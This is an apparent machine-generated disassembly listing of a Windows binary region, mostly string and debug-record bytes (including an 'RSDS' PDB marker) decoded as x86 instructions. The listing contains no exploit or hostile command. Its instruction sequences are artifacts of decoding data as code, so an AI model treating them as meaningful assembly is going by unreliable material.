  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	lods   eax,DWORD PTR ds:[esi]
  42ab59:	cli    
  42ab5a:	mov    al,0x67
  42ab5c:	aad    0xd8
  42ab5e:	in     eax,0x47
  42ab60:	mov    ah,0x15
  42ab62:	(bad)  
  42ab64:	xchg   DWORD PTR [edx-0xe],eax
  42ab67:	jmp    0x42ab88
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
